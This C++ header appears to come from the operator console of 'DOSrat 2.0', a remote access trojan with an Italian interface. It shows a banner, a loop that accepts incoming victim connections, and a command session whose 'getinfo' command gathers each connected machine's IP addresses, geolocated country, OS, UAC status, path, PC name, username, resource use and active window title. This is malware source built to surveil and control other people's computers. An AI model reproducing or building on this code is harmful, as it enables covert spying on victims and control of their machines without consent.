#pragma once

void StampaTitolo(short Returns = 0)
{
    TextColor tc;
    tc.SetColor(tc.Green);

    cout << "  ______  _______ ______                      ______    _____  " << endl;
    cout << " (______)(_______) _____)              _     (_____ \\  (_____) " << endl;
    cout << "  _     _ _     ( (____   ____ _____ _| |_     ____) ) _  __ _ " << endl;
    cout << " | |   | | |   | \\____ \\ / ___|____ (_   _)   / ____/ | |/ /| |" << endl;
    cout << " | |__/ /| |___| |____) ) |   / ___ | | |_   | (_____ |   /_| |" << endl;
    cout << " |_____/  \\_____(______/|_|   \\_____|  \\__)  |_______|_)_____/ " << endl << endl;
    cout << "| Versione [" << Version << "]" << endl;
    cout << "| DOSrat 2.0 by Criper98" << endl;

    for (int i = 0; i < Returns; i++)
        cout << endl;

    tc.SetColor(tc.Default);
}

void StampaPrefix(short PreReturns = 0)
{
    TextColor tc;

    for (int i = 0; i < PreReturns; i++)
        cout << endl;

    tc.SetColor(tc.Yellow);

    cout << "DOSrat 2.0";
    tc.SetColor(tc.Default);
    cout << "> ";
}

void AccettaConnessioni(TcpIP& Server)
{
    int c = 0;
    
    while (true)
    {
        for (int i = 0; i < MAX_CLIENTS; i++)
            if (!Clients[i].IsConnected)
            {
                c = i;
                i = MAX_CLIENTS;
            }

        if (Server.WaitConn(Clients[c].sock))
            COMUNICAZIONI::Inizializzazione(c, Clients[c].sock);
    }
}

void GetInfo(SOCKET Sock)
{
    json j;
    CLInterface cli;
    VectString Header;
    VectString Body;
    IPinfo ipi;

    Header.push_back("INFO");
    Header.push_back("VALORE");

    j = COMUNICAZIONI::GetInfo(Sock);
    ipi.IPaddress = TcpIP::GetIP(Sock);
    IPlocation::GetInfoFromIP(ipi.IPaddress, ipi);

    Body.push_back("IP Wan");
    Body.push_back(ipi.IPaddress);

    Body.push_back("IP Lan");
    Body.push_back(j["IPL"]);

    Body.push_back("Nazione");
    Body.push_back(ipi.Country);

    Body.push_back("OS");
    Body.push_back(j["OS"]);

    Body.push_back("UAC");
    Body.push_back(j["UAC"]);

    Body.push_back("Percorso");
    Body.push_back(j["PATH"]);

    Body.push_back("Versione");
    Body.push_back(j["VER"]);

    Body.push_back("Nome PC");
    Body.push_back(j["PCNAME"]);

    Body.push_back("Nome Utente");
    Body.push_back(j["USERNAME"]);

    Body.push_back("CPU %");
    Body.push_back(j["CPU"]);

    Body.push_back("RAM %");
    Body.push_back(j["RAM"]);

    Body.push_back("Finestra Attiva");
    Body.push_back(j["ACTWIN"]);

    Body.push_back("Data Installazione");
    Body.push_back(j["INSTDATE"]);

    cout << "Informazioni ricevute:" << endl;
    cli.Table(Header, Body);
    
}

void Sessione(int ID, SOCKET Sock)
{
    CLInterface cli;
    TextColor tc;

    string cmd;

    system("cls");
    StampaTitolo(1);
    cli.SubTitle("Sessione Comandi", 60, tc.Green);

    for (bool Controllo = true; Controllo;)
    {
        StampaPrefix();
        getline(cin, cmd);
        cmd = ToLowerCase(cmd);

        if (cmd.find("getinfo") != string::npos)
            GetInfo(Sock);
    }
}